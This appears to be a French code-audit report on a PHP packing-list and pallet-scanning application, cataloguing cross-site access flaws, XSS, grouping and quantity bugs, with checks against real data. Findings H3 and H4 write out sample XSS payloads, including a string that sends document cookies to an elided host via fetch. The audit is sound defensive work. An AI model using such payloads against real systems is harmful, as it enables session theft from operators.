# Rapport — Problèmes détectés dans PackingList

> Audit du code source au 26/10/2026, par **lecture du code uniquement** : rien n'a été exécuté ni modifié.
> Chaque problème a été confirmé en lisant le code concerné. Ceux marqués ✔ ont en plus été revérifiés ligne par ligne pour ce rapport.

## Périmètre

| Zone | Couverte ? |
|---|---|
| Scan des colis, groupage, déplacements, recherche de colis (`Colis`, `ColisController`, vues scan, `app.js`, `search.js`) | ✅ |
| Packing Lists, palettes, exports XLSX/PDF, références, QR palettes | ✅ |
| Sécurité générale : connexion, utilisateurs/rôles/permissions, sites, paramètres, tableau de bord, import théorique, routeur, configuration | ❌ **Non audité** (analyse interrompue) |

## Synthèse

| Gravité | Nombre | Exemples |
|---|---|---|
| 🔴 Haute | 9 | Accès à une palette d'un autre site via l'URL, fuite de données entre sites dans la recherche, failles XSS, état de groupage resté en session, quantités comptées en double |
| 🟠 Moyenne | 9 | Export PDF toujours à 0, export XLSX qui plante, quantités décimales tronquées, dépassement de capacité en scan simultané |
| 🟡 Basse | 13 | Concurrence à la fermeture, fichiers QR orphelins, tri des exports, code mort |

**À traiter en priorité :** H1 à H4 (cloisonnement entre sites et XSS), H5 et H6 (session de groupage) et H9 (quantités en double).

**Confirmé sur les données réelles :** M3 fait déjà perdre **71,5 ML** dans les exports de 20 PL, et H9 concerne déjà **144 colis** (voir la section « Vérification sur les données réelles »).

---

## 🔴 Gravité haute

### H1 — Activer la palette d'un autre site par l'URL ✔
**Où :** [ColisController.php:39-52](../src/Controllers/ColisController.php#L39-L52) (`scanInterface`)

`GET /colis/scan?palette_code=XXX` rend la palette XXX active **sans vérifier le site de l'utilisateur**. Les deux routes de scan ne refont pas ce contrôle ensuite.

**Scénario :** un opérateur du site BK3 ouvre `/colis/scan?palette_code=PAL-BK1-…`. Tous ses scans suivants s'enregistrent sur une palette du site BK1. De plus, comme c'est une requête GET qui modifie l'état, un simple lien suffit pour changer la palette active d'un opérateur : la protection CSRF ne s'applique pas.

### H2 — La recherche montre les données des autres sites
**Où :** `PackingList::search`/`searchByPrefix` ([PackingList.php:401-441](../src/Models/PackingList.php#L401-L441)), `Palette::search`/`searchByPrefix` ([Palette.php:283-323](../src/Models/Palette.php#L283-L323)), `Colis::search` et `getSummaryByField` ([Colis.php:852-865](../src/Models/Colis.php#L852-L865), [944-958](../src/Models/Colis.php#L944-L958)), appelés par `SearchService::performSearch`, `/search/by-of` et `/search/by-sku`

Ces requêtes ne filtrent pas par site. Seule `globalSearch` applique le cloisonnement.

**Scénario :** un utilisateur de BK3 tape `PL`, `PAL`, un OF ou un SKU. Il obtient les PL, palettes, colis et quantités de **tous les sites**, avec les liens pour les ouvrir.

### H3 — XSS via les données des QR colis (recherche et écran de scan)
**Où :** [search.js](../public/js/search.js) lignes 162-247 et [scan.php:524](../src/Views/colis/scan.php#L524)

Le numéro de colis, l'OF, le SKU et les références lus dans les QR sont insérés dans la page avec `innerHTML`, **sans échappement**.

**Scénario :** une étiquette dont le numéro de colis vaut `<img src=x onerror=…>` exécute du JavaScript chez l'opérateur qui la scanne, puis chez tout utilisateur qui retrouve ce colis dans la recherche.

### H4 — XSS dans la confirmation « dé-scanner » ✔
**Où :** [palettes/show.php:347](../src/Views/palettes/show.php#L347)

`htmlspecialchars($colis->package_number)` est placé dans une chaîne JavaScript à l'intérieur de l'attribut `onsubmit="return confirm('…')"`. Le navigateur décode l'entité `&#039;` en `'` avant d'exécuter le JavaScript, donc l'échappement ne protège pas.

**Scénario :** une étiquette dont le numéro de colis contient `');fetch('//…'+document.cookie);//` exécute ce code au clic sur « dé-scanner ».

### H5 — Le groupage reste actif quand on change de palette
**Où :** [ColisController.php:98](../src/Controllers/ColisController.php#L98), [399](../src/Controllers/ColisController.php#L399), [715](../src/Controllers/ColisController.php#L715)

Activer une autre palette, ou cliquer sur « désactiver », efface `active_scan_palette_id` mais **pas** `active_parent_colis_id`.

**Scénario :** un groupage est en cours sur la palette A et l'opérateur passe à la palette B. Les colis suivants deviennent des enfants du parent posé sur A, alors que l'écran affiche B. Le contrôle de capacité est en plus ignoré, même si A a été fermée entre-temps.

### H6 — Parent supprimé : tous les scans échouent pour l'opérateur
**Où :** [Colis.php:416-449](../src/Models/Colis.php#L416-L449), [ColisController.php:656](../src/Controllers/ColisController.php#L656)

Si un colis parent est supprimé alors qu'il est encore le groupage actif dans la session d'un opérateur, chaque scan de cet opérateur viole la clé étrangère `parent_colis_id`.

**Scénario :** l'opérateur voit « Erreur lors de l'enregistrement » à chaque scan, sans explication : le badge de groupage a disparu. Le blocage dure jusqu'à la réinitialisation de la session.

### H7 — Un QR qui ne contient que le numéro ne peut pas démarrer ni terminer un groupage ✔
**Où :** [Colis.php:807-811](../src/Models/Colis.php#L807-L811), [ColisController.php:611](../src/Controllers/ColisController.php#L611), [scan.php:485-487](../src/Views/colis/scan.php#L485-L487)

`parseQrPayload` attend exactement 12 champs, ou le format ancien `clé|valeur`. Un QR qui ne contient que `CO123` est rejeté (« Format du payload invalide »). Seule la forme `package_number|CO123` fonctionne.

**Scénario :** le bouton « Terminer le groupage » envoie le numéro seul, et **échoue donc systématiquement**.

### H8 — Le déplacement en masse ignore le statut de la palette source
**Où :** [ColisController.php:838-876](../src/Controllers/ColisController.php#L838-L876), [Colis.php:300-392](../src/Models/Colis.php#L300-L392)

Le déplacement d'un seul colis vérifie que la palette source est ouverte ([ligne 483](../src/Controllers/ColisController.php#L483)). Le déplacement en masse ne le fait pas.

**Scénario :** on peut vider une palette **fermée** en déplaçant ses colis vers une palette ouverte de la même PL.

### H9 — Quantités comptées en double après certains déplacements
**Où :** [Colis.php:384-386](../src/Models/Colis.php#L384-L386) et [282](../src/Models/Colis.php#L282)

Le déplacement en masse écrit un `palette_id` sur les colis **enfants**. Or la règle est qu'un enfant a `palette_id = NULL`. Un déplacement simple du parent ne met ensuite à jour que la ligne du parent.

**Scénario :** on déplace un groupe en masse vers X, puis le parent seul vers Y. Les enfants apparaissent alors sur X **et** sur Y. Les jointures `c.palette_id = p.id OR cp.palette_id = p.id` renvoient deux lignes par enfant : **la synthèse et les exports de la PL comptent leurs quantités deux fois**.

---

## 🟠 Gravité moyenne

| # | Problème | Où | Scénario |
|---|---|---|---|
| M1 ✔ | **Export PDF : résumé toujours à 0.** `$summaryData` n'est jamais défini dans cette méthode | [PackingListController.php:749](../src/Controllers/PackingListController.php#L749) | Tout export PDF affiche 0 palette, 0 colis, quantité 0, avec un avertissement PHP |
| M2 ✔ | **Export XLSX qui plante.** Le titre d'onglet peut atteindre 9 + 25 = 34 caractères, alors qu'Excel en accepte 31 au maximum | [PackingListController.php:564](../src/Controllers/PackingListController.php#L564) | Une référence de 23 caractères ou plus (ex. code site de 6 lettres + compteur à 4 chiffres) provoque une erreur 500 |
| M3 | **Quantités décimales tronquées** (`(int)`) alors que la colonne est en `DECIMAL(10,3)` | Export XLSX [PackingListController.php:516, 538](../src/Controllers/PackingListController.php#L516) ; total palette [Palette.php:372, 382](../src/Models/Palette.php#L372) ; écarts [TheoreticalExportController.php:222](../src/Controllers/TheoreticalExportController.php#L222) | 3 colis de 0,5 : l'XLSX affiche 0, la palette 1, la PL 1,5 |
| M4 | **Export « Synthèse » XLSX : cellules mal fusionnées.** La vérification de la colonne parente se fait après sa fusion, alors que les cellules fusionnées sont déjà vides | [PackingListController.php:841-863](../src/Controllers/PackingListController.php#L841-L863) | Fusions décalées, voire entre deux clients : l'Excel ne correspond plus à l'écran |
| M5 | **Dépassement de capacité en scan simultané.** Le contrôle et l'insertion ne sont ni dans une transaction ni sous verrou | [ColisController.php:220, 601](../src/Controllers/ColisController.php#L601) | Deux scanneurs sur la même palette, une place restante : `max_colis + 1` colis |
| M6 | **Pas de contrôle de capacité pendant un groupage**, même quand le scan crée un nouveau parent | [ColisController.php:220, 601](../src/Controllers/ColisController.php#L601) | Palette pleine : un nouveau parent est quand même créé et le groupage précédent se termine sans message |
| M7 | **La quantité est traitée différemment selon le chemin de scan.** AJAX : aucune validation (une valeur négative ou non numérique est enregistrée, 0 pour un texte), et la clé ancienne `quantity` est ignorée. Chemin classique : le test `!== 0` sur un nombre décimal est toujours vrai | [ColisController.php:668](../src/Controllers/ColisController.php#L668), [234](../src/Controllers/ColisController.php#L234), [205](../src/Controllers/ColisController.php#L205) | Quantités négatives ou nulles enregistrées ; un QR au format ancien est enregistré sans quantité |
| M8 | **Statistiques par site sans les colis enfants.** Les requêtes filtrées joignent uniquement sur `c.palette_id` | [Colis.php:645, 694-702, 730](../src/Models/Colis.php#L645) | Un utilisateur de site voit moins de scans qu'un administrateur pour le même site |
| M9 | Voir aussi le [rapport numérotation](RAPPORT_PROBLEME_NUMEROTATION.md) : année-semaine fausse dans les références autour du Nouvel An (prochaine fois : 01–03/01/2027) | [ReferenceGenerator.php:94-100](../src/Services/ReferenceGenerator.php#L94-L100) | `2027-S53` au lieu de `2026-S53` |

---

## 🟡 Gravité basse

| # | Problème | Où |
|---|---|---|
| B1 | Une palette peut être créée dans une PL déjà fermée : génération en lot (50 transactions séparées) pendant qu'un autre utilisateur ferme la PL | [Palette.php:48-139](../src/Models/Palette.php#L48), [PackingListController.php:426](../src/Controllers/PackingListController.php#L426) |
| B2 | Une double fermeture simultanée d'une PL écrase l'utilisateur et la date de la première fermeture : pas de `AND status='open'` dans l'UPDATE | [PackingList.php:219](../src/Models/PackingList.php#L219) |
| B3 | Si le dossier `public/qrcodes/palettes` est absent ou non inscriptible, **plus aucune palette ne peut être créée** : le service lève une exception au lieu de renvoyer un QR vide | [QrCodeService.php:57-73](../src/Services/QrCodeService.php#L57), [Palette.php:120](../src/Models/Palette.php#L120) |
| B4 | Fichiers QR orphelins : le PNG n'est jamais supprimé avec la palette (fermeture de PL, suppression) | [Palette.php:216](../src/Models/Palette.php#L216) |
| B5 | Fermer une palette vide empêche ensuite de supprimer la PL, avec un message d'erreur générique | [PaletteController.php:345-368](../src/Controllers/PaletteController.php#L345), [PackingList.php:256](../src/Models/PackingList.php#L256) |
| B6 | Fiche palette : la colonne « Actions » de l'en-tête dépend des permissions, mais les cellules dépendent du statut. Le tableau (DataTables) se casse pour un utilisateur en lecture seule | [palettes/show.php:298, 335](../src/Views/palettes/show.php#L298) |
| B7 | Synthèse à l'écran : le total est arrondi à 0 décimale alors que les lignes en ont 2 (1,25 + 2,5 → « 4 ») | [packing_lists/show.php:287, 295](../src/Views/packing_lists/show.php#L287) |
| B8 | Les exports sont triés comme du texte : « 10 » arrive avant « 9 » | [PackingListController.php:549-553, 723-727](../src/Controllers/PackingListController.php#L549) |
| B9 | XLSX : les numéros longs (18 chiffres) s'affichent en notation scientifique et perdent des chiffres | Export XLSX |
| B10 | Un doublon détecté par l'index unique (cas de concurrence) renvoie une erreur 500 au lieu de « déjà scanné » (409) | [Colis.php:234-236](../src/Models/Colis.php#L234), [ColisController.php:676-678](../src/Controllers/ColisController.php#L676) |
| B11 | Requête `WHERE A OR B AND (filtres)` : les filtres ne s'appliquent qu'à une branche. Sans effet aujourd'hui car aucun filtre n'est passé | [Colis.php:576-617](../src/Models/Colis.php#L576) |
| B12 | Capacité au déplacement en masse : les enfants sélectionnés sont comptés, ce qui fait refuser des déplacements valides | [ColisController.php:861-864](../src/Controllers/ColisController.php#L861) |
| B13 | Code mort ou cassé : `ColisSearchService` appelle `Colis::search` avec de mauvais arguments (TypeError, mais non utilisé) ; `showMoveForm` et `colis/search.php` sans route ; scan classique `processColisScan` inaccessible depuis l'écran ; message « palette plus ouverte » jamais affiché ✔ ([ColisController.php:65-68](../src/Controllers/ColisController.php#L65-L68)) ; couleurs de la barre de progression inversées ([scan.php:505](../src/Views/colis/scan.php#L505)) | divers |

---

## Vérification sur les données réelles (base locale, 26/10/2026)

Requêtes SQL en lecture seule sur `packing_list_db` : environ 25 000 colis, de 07/2025 à 10/2026.

| Constat | Résultat | Conclusion |
|---|---|---|
| **M3** — colis à quantité décimale | **143 colis**, tous en unité **ML** (mètres linéaires), de 6,5 à 34,5 | ⚠️ **Impact réel** : **71,5 ML** disparaissent dans l'export XLSX et les totaux de palette. Cela touche **20 PL** et **54 palettes**. Problème à traiter en priorité, au même niveau qu'un problème de gravité haute |
| **H9** — enfants avec `palette_id` renseigné | **144 enfants** répartis dans **72 groupes**, tous issus d'un seul déplacement en masse le **14/07/2026** entre 11:30 et 11:34 | ⚠️ La condition du double comptage est **déjà présente**. Pour l'instant, aucun enfant n'est sur une autre palette que son parent : il n'y a donc **pas encore** de quantité comptée deux fois. Ce sera le cas dès que l'un de ces 72 parents sera déplacé seul |
| **H7** — format des colis parents | **3 597 parents**, tous enregistrés sous la forme `{"package_number":"…"}` | Confirme que les étiquettes parent utilisent le format ancien `package_number|…`, le seul accepté. Le bouton « Terminer le groupage » envoie le numéro seul et échoue donc |
| **H1** — colis scannés par un utilisateur d'un autre site (hors administrateurs) | **0** | Faille présente dans le code, mais **jamais exploitée** à ce jour |
| **M5** — palettes au-delà de `max_colis` | 0 | Risque théorique, pas encore arrivé |
| **M7** — quantité nulle, négative ou absente | 0 | Pas encore arrivé |
| **M2** — référence PL de 23 caractères ou plus | 0 (19 au maximum aujourd'hui) | L'export XLSX ne plante pas avec les codes site actuels (3 caractères). Il plantera avec un code site de 6 caractères ou plus |
| **B1** — palette ouverte ou générée dans une PL fermée | 0 | Pas encore arrivé |
| **B5** — palette fermée vide | 0 | Pas encore arrivé |
| **B9** — numéros purement numériques de plus de 15 chiffres | 0 | Sans impact avec les formats actuels |

**À retenir :** deux problèmes ont **déjà un effet sur les données**. M3 fausse les quantités en ML, et H9 laisse 144 colis dans un état incohérent. Les autres sont des risques présents dans le code mais pas encore survenus.

## Vérifié et correct

- **CSRF** : contrôle central sur tous les POST ; les jetons sont présents dans les formulaires et les appels AJAX.
- **Injection SQL** : aucune trouvée. Les requêtes sont paramétrées et les tris passent par une liste blanche.
- **Cloisonnement par site** : présent sur toutes les actions PL et palette (fiche, modification, fermeture, réouverture, suppression, exports, génération, impression) et sur la suppression, le déplacement simple et le commentaire d'un colis. Les failles concernent la **recherche** et l'**activation de palette par URL** (H1, H2).
- **Compteurs de référence** : l'incrément se fait dans la transaction de l'appelant (connexion PDO partagée). Pas de doublon, et le réessai en cas de collision fonctionne.
- **Sommes parent/enfant** : correctes dans les requêtes PL, palette et synthèse, tant que la règle « enfant = `palette_id` NULL » est respectée (voir H9).
- **Exports** : `ExportSanitizer` protège les cellules XLSX contre l'injection de formules.

## Environnement (constaté le 26/10/2026)

- **Extensions PHP bloquées** par une stratégie de contrôle d'application Windows : `pdo_mysql`, `mbstring`, `openssl`, `curl`, `mysqli`, `exif`, `ftp`, `pdo_sqlite`. Sans `pdo_mysql`, l'application locale ne peut plus se connecter à la base. Il faut que le service informatique autorise `C:\xampp\php\ext\`.
- **MySQL local arrêté** au moment de l'audit (connexion refusée).

## Prochaines étapes conseillées

1. **Auditer la zone non couverte** : connexion et anti-brute-force, gestion des utilisateurs et rôles (élévation de privilèges, cloisonnement), redirections, configuration (`APP_URL` construit depuis `HTTP_HOST`, affichage des erreurs), dumps SQL présents dans le dossier web.
2. Corriger d'abord **H1, H2, H3, H4** (sécurité et cloisonnement), puis **H5, H6, H7, H9** (fiabilité du scan et des quantités), puis **M1, M2** (exports cassés).
3. Ajouter des tests pour le groupage et les déplacements : c'est la zone la plus fragile.
